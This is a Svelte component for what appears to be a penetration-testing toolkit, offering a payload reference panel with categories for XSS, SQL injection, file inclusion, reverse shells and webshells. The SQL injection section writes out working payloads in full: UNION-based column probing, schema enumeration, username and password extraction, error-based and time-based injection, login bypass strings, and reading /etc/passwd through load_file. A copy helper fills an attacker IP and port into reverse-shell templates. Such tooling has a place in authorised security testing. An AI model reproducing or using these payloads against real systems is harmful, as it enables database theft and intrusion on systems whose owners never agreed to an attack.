<script lang="ts">
  // Payload 参考库面板
  // XSS / SQLi / LFI / 反弹Shell / Webshell / 命令参考
  import { toastStore } from '@/stores/ui';
  import payloadsData from '@/lib/data/payloads.json';

  // —— 类型 ——
  type CategoryKey = 'xss' | 'sqli' | 'lfi' | 'reverse_shell' | 'webshell' | 'cmdref';
  type PayloadItem = { name?: string; payload: string; desc?: string; tags?: string[] };
  type SubCategoryMap = Record<string, PayloadItem[]>;

  // —— 分类定义 ——
  const categories: { key: CategoryKey; label: string; icon: string }[] = [
    { key: 'xss', label: 'XSS', icon: '⚡' },
    { key: 'sqli', label: 'SQLi', icon: '💉' },
    { key: 'lfi', label: 'LFI', icon: '📂' },
    { key: 'reverse_shell', label: '反弹Shell', icon: '🖥️' },
    { key: 'webshell', label: 'Webshell', icon: '🐚' },
    { key: 'cmdref', label: '命令参考', icon: '📋' },
  ];

  const allPayloads = payloadsData as Record<CategoryKey, SubCategoryMap>;

  // —— 状态 ——
  let activeCategory = $state<CategoryKey>('xss');
  let searchText = $state('');
  let expandedSubs = $state<Record<string, boolean>>({});
  let sqliColumns = $state(3);
  let sqliTable = $state('users');
  let revIp = $state('');
  let revPort = $state('4444');

  // —— SQLi 动态构建 ——
  function sqliColsExpr(expr: string, slot: number, n: number): string {
    const cols: string[] = [];
    for (let i = 0; i < n; i++) cols.push(i === slot ? expr : 'NULL');
    return cols.join(',');
  }

  function buildSqliPayloads(): SubCategoryMap {
    const n = sqliColumns;
    const table = sqliTable;
    const nulls = Array(n).fill('NULL').join(',');
    return {
      '列数探测': [
        ...Array.from({ length: Math.min(n + 2, 10) }, (_, i) => ({
          payload: `' ORDER BY ${i + 1}--+`,
        })),
        { payload: `' UNION SELECT ${nulls}--+`, desc: `${n} 列 UNION 探测` },
      ],
      '版本枚举': [
        { payload: `' UNION SELECT ${sqliColsExpr('version()', 1, n)}--+`, desc: 'MySQL version()' },
        { payload: `' UNION SELECT ${sqliColsExpr('@@version', 1, n)}--+`, desc: 'MySQL @@version' },
        { payload: `' UNION SELECT ${sqliColsExpr('@@GLOBAL.VERSION', 1, n)}--+`, desc: 'MySQL 全局版本' },
      ],
      '表名枚举': [
        { payload: `' UNION SELECT ${sqliColsExpr('GROUP_CONCAT(table_name)', 1, n)} FROM information_schema.tables WHERE table_schema=database()--+` },
        { payload: `' UNION SELECT ${sqliColsExpr('table_name', 1, n)} FROM information_schema.tables--+` },
      ],
      '列名枚举': [
        { payload: `' UNION SELECT ${sqliColsExpr('GROUP_CONCAT(column_name)', 1, n)} FROM information_schema.columns WHERE table_name='${table}'--+` },
      ],
      '数据提取': [
        { payload: `' UNION SELECT ${sqliColsExpr('GROUP_CONCAT(username,0x3a,password)', 1, n)} FROM ${table}--+`, desc: 'MySQL 0x3a 分隔' },
        { payload: `' UNION SELECT ${sqliColsExpr("username||':'||password", 1, n)} FROM ${table}--+`, desc: 'Oracle/SQLite || 拼接' },
      ],
      '报错注入': [
        { payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--+", desc: 'EXTRACTVALUE' },
        { payload: "' AND 1=CAST((SELECT version()) AS INT)--+", desc: 'CAST' },
        { payload: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--+", desc: 'UPDATEXML' },
      ],
      '延时注入': [
        { payload: "' AND IF(1=1,SLEEP(5),0)--+", desc: 'MySQL SLEEP' },
        { payload: "' AND (SELECT SLEEP(5))--+", desc: 'MySQL 子查询 SLEEP' },
        { payload: "'; WAITFOR DELAY '0:0:5'--+", desc: 'MSSQL WAITFOR' },
      ],
      '认证绕过': [
        { payload: "' OR 1=1--+" },
        { payload: "' OR '1'='1" },
        { payload: "admin'--" },
        { payload: "' OR '1'='1'/*" },
      ],
      'Order Union': [
        { payload: `' ORDER BY 1 UNION SELECT NULL,username,password FROM ${table}--+` },
        { payload: "' ORDER BY 1,2 UNION SELECT NULL,load_file('/etc/passwd'),NULL--+", desc: '文件读取' },
      ],
    };
  }

  // —— 数据获取 ——
  function getCategoryData(key: CategoryKey): SubCategoryMap {
    if (key === 'sqli') return buildSqliPayloads();
    return allPayloads[key] || {};
  }

  function countInSub(sub: PayloadItem[]): number {
    return sub.length;
  }

  function countInCategory(key: CategoryKey): number {
    const data = getCategoryData(key);
    return Object.values(data).reduce((sum, items) => sum + items.length, 0);
  }

  // —— 派生状态 ——
  let stats = $derived(
    categories.reduce(
      (acc, cat) => {
        acc[cat.key] = countInCategory(cat.key);
        return acc;
      },
      {} as Record<CategoryKey, number>,
    ),
  );

  let filteredData = $derived(() => {
    const data = getCategoryData(activeCategory);
    const q = searchText.toLowerCase().trim();
    if (!q) return data;

    const result: SubCategoryMap = {};
    for (const [subName, items] of Object.entries(data)) {
      if (subName.toLowerCase().includes(q)) {
        result[subName] = items;
        continue;
      }
      const filtered = items.filter(
        (item) =>
          (item.name || '').toLowerCase().includes(q) ||
          item.payload.toLowerCase().includes(q) ||
          (item.desc || '').toLowerCase().includes(q),
      );
      if (filtered.length > 0) result[subName] = filtered;
    }
    return result;
  });

  // —— 操作 ——
  function toggleSub(subName: string) {
    expandedSubs[subName] = !expandedSubs[subName];
    expandedSubs = { ...expandedSubs };
  }

  function expandAll() {
    const data = filteredData();
    const next: Record<string, boolean> = {};
    for (const key of Object.keys(data)) {
      next[key] = true;
    }
    expandedSubs = next;
  }

  function collapseAll() {
    expandedSubs = {};
  }

  async function copyPayload(text: string) {
    try {
      await navigator.clipboard.writeText(text);
      toastStore.show('已复制', 'success');
    } catch {
      toastStore.show('复制失败', 'error');
    }
  }

  async function copyReverseShell(template: string) {
    if (!revIp || !revPort) {
      toastStore.show('请先填写 IP 和端口', 'warning');
      return;
    }
    const cmd = template.replace(/\{ip\}/g, revIp).replace(/\{port\}/g, revPort);
    try {
      await navigator.clipboard.writeText(cmd);
      toastStore.show('已复制（IP/Port 已替换）', 'success');
    } catch {
      toastStore.show('复制失败', 'error');
    }
  }
</script>

<div class="space-y-3">
  <!-- 顶部统计（兼分类切换） -->
  <div class="flex flex-wrap gap-1 text-xs">
    {#each categories as cat}
      <button
        class="badge cursor-pointer transition-all duration-[var(--vk-dur-fast)] ease-[var(--vk-ease)] active:scale-[0.96] {activeCategory === cat.key ? 'bg-primary text-white' : 'opacity-60 hover:opacity-100'}"
        onclick={() => (activeCategory = cat.key)}
      >
        {cat.icon} {cat.label} <span class="ml-1 font-mono">{stats[cat.key]}</span>
      </button>
    {/each}
    <span class="badge opacity-50 ml-auto font-mono">合计 {Object.values(stats).reduce((a, b) => a + b, 0)}</span>
  </div>

  <!-- 搜索框 -->
  <input class="input text-xs font-mono" placeholder="搜索 payload / 分类名..." aria-label="搜索 payload" bind:value={searchText} />

  <!-- SQLi 配置区 -->
  {#if activeCategory === 'sqli'}
    <div class="card p-2">
      <div class="text-xs text-gray-500 mb-2">SQLi 动态参数（调整后自动重新生成）</div>
      <div class="flex gap-2 items-end">
        <div>
          <label for="payload-sqli-cols" class="block text-xs text-gray-500 mb-1">列数 (N)</label>
          <input
            id="payload-sqli-cols"
            class="input text-xs w-16 text-center font-mono"
            type="number"
            min="1"
            max="10"
            bind:value={sqliColumns}
          />
        </div>
        <div class="flex-1">
          <label for="payload-sqli-table" class="block text-xs text-gray-500 mb-1">目标表名</label>
          <input id="payload-sqli-table" class="input text-xs font-mono" placeholder="users" bind:value={sqliTable} />
        </div>
      </div>
    </div>
  {/if}

  <!-- 反弹 Shell IP/Port -->
  {#if activeCategory === 'reverse_shell'}
    <div class="card p-2">
      <div class="text-xs text-gray-500 mb-2">反弹 Shell 参数（复制时自动替换）</div>
      <div class="flex gap-2 items-end">
        <div class="flex-1">
          <label for="payload-rev-ip" class="block text-xs text-gray-500 mb-1">监听 IP</label>
          <input id="payload-rev-ip" class="input text-xs font-mono" placeholder="10.0.0.1" bind:value={revIp} />
        </div>
        <div class="w-24">
          <label for="payload-rev-port" class="block text-xs text-gray-500 mb-1">端口</label>
          <input id="payload-rev-port" class="input text-xs font-mono text-center" placeholder="4444" bind:value={revPort} />
        </div>
      </div>
    </div>
  {/if}

  <!-- 展开/折叠全部 -->
  <div class="flex gap-1">
    <button class="btn btn-xs btn-ghost" onclick={expandAll}>展开全部</button>
    <button class="btn btn-xs btn-ghost" onclick={collapseAll}>折叠全部</button>
  </div>

  <!-- Payload 子分类列表 -->
  {#each Object.entries(filteredData()) as [subName, items]}
    {@const isExpanded = expandedSubs[subName]}
    <div class="card">
      <button
        class="w-full flex items-center justify-between p-2 text-left hover:bg-gray-50 dark:hover:bg-gray-800/50 rounded"
        onclick={() => toggleSub(subName)}
      >
        <span class="text-xs font-semibold">{subName}</span>
        <span class="flex items-center gap-1">
          <span class="badge text-xs">{items.length}</span>
          <span class="text-xs transition-transform {isExpanded ? 'rotate-90' : ''}">&#9654;</span>
        </span>
      </button>

      {#if isExpanded}
        <div class="border-t border-gray-100 dark:border-gray-800">
          {#each items as item, i (i)}
            <div class="p-2 border-b border-gray-50 dark:border-gray-800/50 last:border-b-0 hover:bg-gray-50/50 dark:hover:bg-gray-800/30">
              <div class="flex items-start justify-between gap-2">
                <div
                  class="flex-1 min-w-0 cursor-pointer"
                  role="button"
                  tabindex="0"
                  onclick={() => copyPayload(item.payload)}
                  onkeydown={(e) => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); copyPayload(item.payload); } }}
                  title="点击复制"
                >
                  {#if item.name}
                    <div class="text-xs font-medium text-gray-600 dark:text-gray-400 mb-0.5">
                      {item.name}
                      {#if item.tags}
                        {#each item.tags as tag}
                          <span class="badge ml-1 text-xs opacity-60">{tag}</span>
                        {/each}
                      {/if}
                    </div>
                  {/if}
                  <code
                    class="block text-xs font-mono break-all whitespace-pre-wrap text-gray-800 dark:text-gray-200 select-all"
                  >{item.payload}</code>
                  {#if item.desc}
                    <div class="text-xs text-gray-400 mt-1">{item.desc}</div>
                  {/if}
                </div>
                <button
                  class="btn btn-xs shrink-0"
                  onclick={(e) => {
                    e.stopPropagation();
                    if (activeCategory === 'reverse_shell' && item.payload.includes('{ip}')) copyReverseShell(item.payload);
                    else copyPayload(item.payload);
                  }}
                >
                  复制
                </button>
              </div>
            </div>
          {/each}
        </div>
      {/if}
    </div>
  {/each}

  <!-- 空状态 -->
  {#if Object.keys(filteredData()).length === 0}
    <div class="text-xs text-gray-400 text-center py-6">
      {searchText ? '没有匹配的 payload' : '该分类暂无数据'}
    </div>
  {/if}
</div>
